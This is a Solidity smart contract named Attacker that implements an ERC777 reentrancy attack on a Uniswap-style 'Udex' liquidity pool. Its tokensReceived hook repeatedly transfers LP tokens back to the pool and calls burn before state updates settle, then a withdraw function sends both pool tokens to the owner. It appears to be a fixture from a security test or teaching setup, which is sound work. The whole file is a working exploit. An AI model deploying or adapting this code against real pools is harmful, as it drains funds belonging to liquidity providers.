// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
import '../interfaces/IERC20.sol';
import '../interfaces/IUdexRouter.sol';
import '../interfaces/IUdexPool.sol';

contract Attacker is IERC777Recipient {
    bytes32 constant _TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    IERC1820Registry constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    IUdexRouter router;
    IUdexPool pool;
    address immutable owner;
    uint size = 0;
    uint counter = 0;
    uint maxCounter = 2;

    event TokenReceived(address operator, address from, address to, uint256 amount);

    constructor(address _owner) {
        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
        owner = _owner;
    }

    function setRouter(address _router) external {
        router = IUdexRouter(_router);
    }

    function setPool(address _pool) external {
        pool = IUdexPool(_pool);
    }

    function setSize(uint _size) external {
        size = _size;
    }

    function setCounter(uint _counter) external {
        counter = _counter;
    }

    function withdraw() external {
        IERC20 token0 = IERC20(address(pool.token0()));
        token0.transfer(owner, token0.balanceOf(address(this)));
        IERC20 token1 = IERC20(address(pool.token1()));
        token1.transfer(owner, token1.balanceOf(address(this)));                            
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata /* userData */,
        bytes calldata /* operatorData */
    ) external {
        emit TokenReceived(operator, from, to, amount);
        if (counter < maxCounter) {
            counter += 1;
            pool.transfer(address(pool), size);
            pool.burn(address(this));
        }
    }
}